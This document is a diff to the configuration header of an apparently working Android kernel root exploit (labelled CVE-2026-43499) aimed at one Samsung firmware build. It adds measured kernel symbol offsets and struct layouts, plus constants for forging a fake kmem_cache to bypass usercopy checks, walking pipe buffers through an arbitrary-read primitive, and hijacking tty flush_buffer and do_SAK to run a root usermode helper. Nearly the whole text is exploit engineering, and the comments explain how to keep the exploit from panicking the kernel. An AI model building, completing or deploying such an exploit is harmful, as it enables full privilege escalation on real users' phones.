@@ -206,10 +206,192 @@
 #define OVERRIDE_CREDS_OFF        0x0011f1dcULL
 #define ROOT_TASK_GROUP_OFF       0x02cb9ac0ULL
 #define SELINUX_ENFORCING_OFF     0x02d8e5c0ULL
+/* kmalloc_caches.
+ *
+ * This offset is 0xC0 (24 slots) PAST the real table start: reading 42 slots
+ * from it yields the tail of the table (cgroup row slots 0..17) followed by
+ * unrelated adjacent .bss (timestamps/counters), so the pipe cache gate never
+ * matches. The real table start was located on-device via the kernel's own
+ * alias invariant - kmalloc_caches_init() sets
+ * kmalloc_caches[CGROUP][i] == kmalloc_caches[NORMAL][i], so a correct window
+ * has slot10==slot24 and slot11==slot25 - and the unique offset reproducing the
+ * known-good GZE5 values (slot10=ffffff80011d2780, slot11=ffffff80011d2900) is
+ * this one minus 0xC0.
+ *
+ * The table base itself is deliberately NOT changed. After the pipe-page
+ * preparation child has run, the ashmem-name AAR window no longer covers
+ * addresses below this one - reading table-start-relative slot 10 faults the
+ * kernel outright, while this address reads fine. Since the cgroup row aliases
+ * the normal row, the two qwords at this offset ARE true slots 24/25 and
+ * therefore also true slots 10/11, so two reads here recover every value the
+ * gate needs. See pipe.c:pipe_reclaim_cache_gate(). */
 #define KMALLOC_CACHES_OFF        0x020644f8ULL
-#define ANON_PIPE_BUF_OPS_OFF     0x01e7f4e0ULL
+/* anon_pipe_buf_ops. Measured on F946BXXS7GZH2, not inherited: every populated
+ * pipe_buffer in the process's own pipes reports ops = KIMAGE_TEXT_BASE +
+ * 0x01e7f420 (0xffffffc00a06f420 on a typical boot), and the inherited 0x01e7f4e0 was
+ * 0xc0 too high - so no buffer ever matched. Confirmed across ~2112 buffers on fds
+ * 31-137 with 65 non-empty, all agreeing on the same address. */
+#define ANON_PIPE_BUF_OPS_OFF     0x01e7f420ULL
+
+/* ---- Direct (deterministic) pipe-buffer walk -------------------------
+ *
+ * ALL of the following were read out of the raw BTF blob embedded in the
+ * F946BXXS7GZH2 kernel Image (kernel offset 0x21ef2ac, 6094556 bytes, BTF
+ * v1), i.e. measured from the exact firmware this payload runs on, not
+ * copied and not assumed. BTF stores member offsets in BITS; the byte values
+ * below are those divided by 8.
+ *
+ *   struct task_struct      size 0x1200  tasks 0x4d0  pid 0x5d8  files 0x7d8
+ *                                       real_cred 0x790  cred 0x798  usage 0x38
+ *   struct file             size 0x108   private_data 0xd8  f_op 0x28
+ *   struct pipe_inode_info  size 0x0b8   head 0x60  tail 0x64  max_usage 0x68
+ *                                       ring_size 0x6c  bufs 0xa8  tmp_page 0x90
+ *   struct pipe_buffer      size 0x28    page 0x00 offset 0x08 len 0x0c
+ *                                       ops 0x10 flags 0x18 private 0x20
+ *   struct kmem_cache       size 0x108   size 0x18 object_size 0x1c align 0x50
+ *                                       useroffset 0xf4 usersize 0xf8
+ *
+ * files_struct and fdtable are not exported to BTF, so FILES_FDT_OFF and
+ * FDTABLE_FD_OFF are derived from include/linux/fdtable.h in the matching
+ * 5.15.189-android13 source tree (atomic_t count; bool resize_in_progress;
+ * wait_queue_head_t resize_wait; then fdt) and are additionally proved at
+ * runtime by the fdtable invariants.
+ *
+ * Every value is re-checked before it is dereferenced, so a wrong one makes the
+ * walk return 0 rather than fault the kernel.
+ */
+#define PIPE_WALK_TASK_TASKS_OFF   0x4d0ULL
+#define PIPE_WALK_TASK_PID_OFF     0x5d8ULL
+#define PIPE_WALK_TASK_FILES_OFF   0x7d8ULL
+#define PIPE_WALK_FILES_FDT_OFF    0x20ULL
+#define PIPE_WALK_FDTABLE_MAX_FDS  0x00ULL
+#define PIPE_WALK_FDTABLE_FD_OFF   0x08ULL
+#define PIPE_WALK_FILE_PRIVATE_OFF 0xd8ULL
+#define PIPE_WALK_PIPE_HEAD_OFF    0x60ULL
+#define PIPE_WALK_PIPE_TAIL_OFF    0x64ULL
+#define PIPE_WALK_PIPE_RING_OFF    0x6cULL
+#define PIPE_WALK_PIPE_BUFS_OFF    0xa8ULL
+#define PIPE_WALK_MAX_STEPS        16384
+/* Separate budget for the step-back retry in the task walk. That path does `i--`, which
+ * the loop's `i++` cancels, so PIPE_WALK_MAX_STEPS is not enforced there. */
+#define PIPE_WALK_MAX_RETRIES     8
+
+/* Cleared band inside the reclaimed ORDER3 page that pipe_walk_prove_descriptors() uses
+ * as its proof target. It must not overlap anything the payload already occupies there:
+ * the fake file_operations (+0x1180), the CFI scratch, the synthetic kmem_cache
+ * descriptor, the fake waiters, or the root-stage work/data at +0x6000 / +0x6200.
+ * +0x800 sits in the clear band below the fake fops table. */
+#define PIPE_WALK_PROOF_OFF        0x800ULL
+/* Must cover the longest proof tag (the write tag plus its NUL, currently 35). */
+#define PIPE_WALK_PROOF_MAX        0x40ULL
+
+/* fd scan cap and the pipe_buffer stride (page 0x00, offset 0x08, len 0x0c, ops 0x10,
+ * flags 0x18, private 0x20 -> 0x28, per BTF/8). */
+#define PIPE_WALK_MAX_FDS           512ULL
+#define PIPE_WALK_PIPE_BUF_STRIDE   0x28ULL
+
+/* Per-object guard cache sizes.
+ *
+ * The fake kmem_cache is built with size = object_size = inuse = usersize = cache_size,
+ * so this value is the object size the guard is claiming to cover. The fork uses a
+ * distinct value per object type; using one oversized value for everything made the
+ * usercopy window far larger than the object, which is very likely why guarded reads
+ * remained marginal. Values are the fork's, and task_struct/files_struct/file sizes
+ * agree with the BTF measured from this firmware (task_struct 0x1200, file 0x108).
+ *   task_struct 4608 (0x1200), files_struct 704 (0x2c0), file 320 (0x140)
+ */
+#define PIPE_WALK_TASK_CACHE_SIZE   4608ULL
+#define PIPE_WALK_FILES_CACHE_SIZE  704ULL
+/* Object sizes below are THIS device's real sizeof(), read out of its own vmlinux.btf - not
+ * the reference fork's, which targets a different SoC. The guard works by installing a fake
+ * kmem_cache whose size/inuse/usersize all equal the value passed here, so that the kernel's
+ * own __check_heap_object() bounds test accepts our read span. Two consequences:
+ *   - the value MUST cover the read span measured from the object start, or the read aborts;
+ *   - it should NOT exceed the real object, because every extra byte widens the window in
+ *     which a concurrent kernel allocation on that slab page is misled. That is the measured
+ *     "one oversized value left reads marginal" failure.
+ * BTF sizes: task_struct 4608, files_struct 704, file 264 (0x108), pipe_inode_info 184 (0xb8).
+ * The pinfo read spans head@0x60..bufs@0xa8+8 = 0x60..0xb0 = 176 bytes, which fits 184 exactly. */
+#define PIPE_WALK_FILE_CACHE_SIZE   264ULL
+#define PIPE_WALK_PINFO_CACHE_SIZE  184ULL
+
+/* Order-3 allocation: 8 pages. The reclaim pipes are sized to 32 slots, matching the
+ * fork (TARGET_PIPE_SLOTS 32, TARGET_PIPE_COUNT 240). */
+#define PIPE_WALK_PIPE_SLOTS        32ULL
+
+/* Slab scan chunk, matching the fork's TARGET_PIPE_SCAN_CHUNK. The guard's synthetic
+ * cache covers the read, so read width and cache size have to agree. */
+#define PIPE_WALK_SCAN_CHUNK        0x400ULL
+
+/* Root-stage TTY geometry. All values read out of the DEVICE BTF
+ * (vmlinux.btf from F946BXXS7GZH2), not copied blindly from the fork's target.h - though
+ * every one of them matches the fork exactly, which is a good cross-check that the BTF parse
+ * and the ported constants describe the same kernel family.
+ *
+ *   struct tty_struct     size 0x340: magic@0x00 ops@0x18 index@0x20 SAK_work@0x2f8 port@0x328
+ *   struct tty_operations size 0x118: flush_buffer@0xa8
+ *   struct subprocess_info size 0x70 (112): work@0x00 complete@0x30 path@0x38 argv@0x40
+ *                                     envp@0x48 wait@0x50 retval@0x54
+ *                                     (so work_struct is 0x30 = 48 bytes here)
+ *
+ * Note this kernel's BTF names the field SAK_work, not sa_work; the offset is the same. */
+#define TTY_FILE_TTY_OFF            0x00ULL
+#define TTY_FILE_FILE_OFF           0x08ULL
+#define TTY_MAGIC_OFF               0x00ULL
+#define TTY_MAGIC                   0x5401U
+#define TTY_OPS_OFF                 0x18ULL
+#define TTY_INDEX_OFF               0x20ULL
+#define TTY_SAK_WORK_OFF            0x2f8ULL
+#define TTY_PORT_OFF                0x328ULL
+#define TTY_OPS_SIZE                0x118U
+/* struct tty_operations slot offsets, verified against this device's own vmlinux.btf
+ * (BTF reports bit offsets; divided by 8 below). The struct is __randomize_layout in the
+ * source header, so these must come from the running kernel's BTF and not from tty_driver.h. */
+#define TTY_OPS_LOOKUP_OFF          0x00U
+#define TTY_OPS_OPEN_OFF            0x18U
+#define TTY_OPS_WRITE_OFF           0x38U
+#define TTY_OPS_IOCTL_OFF           0x60U
+#define TTY_OPS_FLUSH_BUFFER_OFF    0xa8U
+
+#define WORK_DATA_OFF               0x00U
+#define WORK_ENTRY_OFF              0x08U
+#define WORK_FUNC_OFF               0x18U
+#define WORK_PENDING_BIT            0x1ULL
+
+#define UMH_SUBPROCESS_INFO_SIZE    112U
+#define UMH_SUBPROCESS_WORK_SIZE    48U
+#define UMH_SUBPROCESS_COMPLETE_OFF 48U
+#define UMH_COMPLETION_SIZE         32U
+
+/* Distance between consecutive `file` objects. Measured on device: the 240 reclaim
+ * pipe files land in one slab at a fixed stride, which is what lets a single guarded
+ * read cover many of them instead of one guard per fd. */
+#define PIPE_WALK_FILE_STRIDE       0x100ULL
+
+/* Cap on a single guarded span read. This bounds both the guard's cache size and the
+ * AAR transfer; the fork keeps every read small, and the point of the run read is to
+ * cut guard cycles, not to introduce a new width that might not be tolerated. */
+#define PIPE_WALK_MAX_SPAN          0x2000ULL
+
 #define SYSTEM_UNBOUND_WQ_OFF     0x02a90800ULL
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL
+
+/* tty SAK trigger, resolved from the Image's kallsyms (not guessed).
+ *
+ * do_SAK(tty) is drivers/tty/tty_io.c:3098, EXPORT_SYMBOL'd at L3104. It is what the root
+ * stage installs into tty->ops->flush_buffer so that tty_driver_flush_buffer() ->
+ * do_SAK() -> schedule_work(&tty->SAK_work) hands the borrowed work_struct to the real
+ * workqueue machinery (locking, colour, counters, wake_up_worker) instead of us forging
+ * those by hand.
+ *
+ * All three offsets verified against the device kallsyms table; 13 independent symbols
+ * cross-checked exact (call_usermodehelper_exec_work 0x001045d0, system_unbound_wq
+ * 0x02a90800, init_task 0x02c05080, root_task_group 0x02cb9ac0, anon_pipe_buf_ops
+ * 0x01e7f420, configfs_read_iter, configfs_bin_write_iter, noop_llseek, prepare_kernel_cred,
+ * commit_creds, override_creds, sysctl_bootid, random_table) with zero mismatches.
+ * File offset equals the KIMAGE_TEXT_BASE-relative offset. */
+#define DO_SAK_OFF                 0x000bb8728ULL
+#define DO_SAK_WORK_OFF            0x000bb5f14ULL
 
 #define ASHMEM_FOPS_OFF           0x0200d538ULL
 #define ASHMEM_MISC_FOPS_OFF      0x02bfcf28ULL
@@ -243,6 +425,13 @@
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 #define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+
+/* tty SAK trigger, used by the PTY root stage: installed into tty->ops->flush_buffer so
+ * tty_driver_flush_buffer() -> do_SAK() -> schedule_work(&tty->SAK_work) hands our borrowed
+ * work_struct to the real workqueue machinery. Offsets resolved from the device kallsyms
+ * and cross-checked on 13 other symbols with zero mismatches - see MEMORY.md. */
+#define DO_SAK (KIMAGE_TEXT_BASE + DO_SAK_OFF)
+#define DO_SAK_WORK (KIMAGE_TEXT_BASE + DO_SAK_WORK_OFF)
 
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
 #define ROOT_UMH_WORK_OFF 0x6000
@@ -293,6 +482,13 @@
 #define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
 
 #define CFG_PAGE_OFF 16
+/* configfs_buffer (fs/configfs/file.c:29-47, BTF sizeof 0x80):
+ *   count 0x00  pos 0x08  page 0x10  ops 0x18  mutex 0x20 (sizeof 0x30)  needs_read_fill 0x50
+ * The ashmem name lands at configfs_buffer + ASHMEM_NAME_PREFIX_LEN(11), so a control-blob
+ * byte i is at struct offset i+11. mutex MUST arrive as 48 zero bytes: configfs_read_iter
+ * does mutex_lock(&buffer->mutex) first (file.c:86) and with CONFIG_DEBUG_MUTEXES=n
+ * MUTEX_WARN_ON expands to nothing, so a bogus owner hangs with no oops. */
+#define CFG_MUTEX_OFF 32
 #define CFG_NEEDS_READ_FILL_OFF 80
 #define CFG_BIN_BUFFER_OFF 88
 #define CFG_BIN_BUFFER_SIZE_OFF 96
@@ -309,14 +505,55 @@
 #define POOL_WORKLIST_OFF 0x20
 #define POOL_NR_IDLE_OFF 0x34
 
-#define WORK_DATA_OFF 0x00
-#define WORK_ENTRY_OFF 0x08
-#define WORK_FUNC_OFF 0x18
+/* WORK_DATA_OFF / WORK_ENTRY_OFF / WORK_FUNC_OFF are defined above, verified against this
+ * device's BTF (struct work_struct: data=0x00, entry=0x08, func=0x18, size=0x30). */
 
 #define STRUCT_PAGE_SIZE 0x40
+#define STRUCT_PAGE_FLAGS_OFF 0x00
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
 #define STRUCT_SLAB_CACHE_OFF 0x18
 #define STRUCT_PAGE_TYPE_OFF 0x30
+
+/* PageSlab() mask. From the BTF enum pageflags of THIS kernel's own vmlinux.btf, after
+ * config resolution: PG_locked 0, PG_referenced 1, PG_uptodate 2, PG_dirty 3, PG_lru 4,
+ * PG_active 5, PG_workingset 6, PG_waiters 7, PG_error 8, PG_slab 9. So bit 9, 0x200 -
+ * NOT bit 1, which is PG_referenced and would pass on every hot page.
+ *
+ * Guarding this matters because struct page's 5-word union aliases slab_cache (+0x18)
+ * with mapping on a pagecache page, and with compound_dtor/order/mapcount/nr on a
+ * compound tail page. Writing our fake cache pointer into either is silent corruption. */
+#define STRUCT_PAGE_SLAB_FLAG 0x200ULL
+
+/* PG_head, bit 16 of enum pageflags. Set on the HEAD page of a compound allocation, so
+ * together with the compound_head bit-0 protocol it tells a standalone page from a tail
+ * page. A tail page is neither a slab head nor a standalone allocation: it has no
+ * kmem_cache to redirect, and +0x18 aliases compound_dtor/order/mapcount/nr, so writing
+ * our fake cache pointer there is silent corruption. */
+#define STRUCT_PAGE_COMPOUND_HEAD_FLAG 0x10000ULL
+
+/* slab_cache_guard support (port of the soumarcelino fork).
+ *
+ * On F946BXXS7GZH2 the ashmem-name AAR can WRITE any direct-map address but a READ of
+ * one panics the kernel - measured, including at a live pointer handed to us by
+ * kmalloc_caches. The fork sidesteps this by first pointing the object's slab_cache at
+ * a synthetic kmem_cache whose usercopy region spans the whole object, which makes the
+ * subsequent read legal. See slab_cache_guard_begin/end() in src/pipe.c.
+ *
+ * kmem_cache field offsets below are from the BTF blob in this firmware's own kernel
+ * Image (bits/8): size 0x18, object_size 0x1c, inuse/align 0x50, useroffset 0xf4,
+ * usersize 0xf8. Descriptor size 0x108 is the full struct kmem_cache. */
+#define KMEM_CACHE_SIZE_OFF 0x18ULL
+#define KMEM_CACHE_OBJECT_SIZE_OFF 0x1cULL
+#define KMEM_CACHE_INUSE_OFF 0x50ULL
+#define KMEM_CACHE_ALIGN_OFF 0x54ULL
+#define KMEM_CACHE_USEROFFSET_OFF 0xf4ULL
+#define KMEM_CACHE_USERSIZE_OFF 0xf8ULL
+#define KMEM_CACHE_DESC_SIZE 0x108ULL
+
+/* Where the synthetic kmem_cache lives inside our own payload page. The payload page
+ * is a direct-map address we can write, which is exactly the capability the guard
+ * needs. Kept clear of the fops table and the scratch area. */
+#define FAKE_KMEM_CACHE_LIVE_OFF 0x3a00ULL
 
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
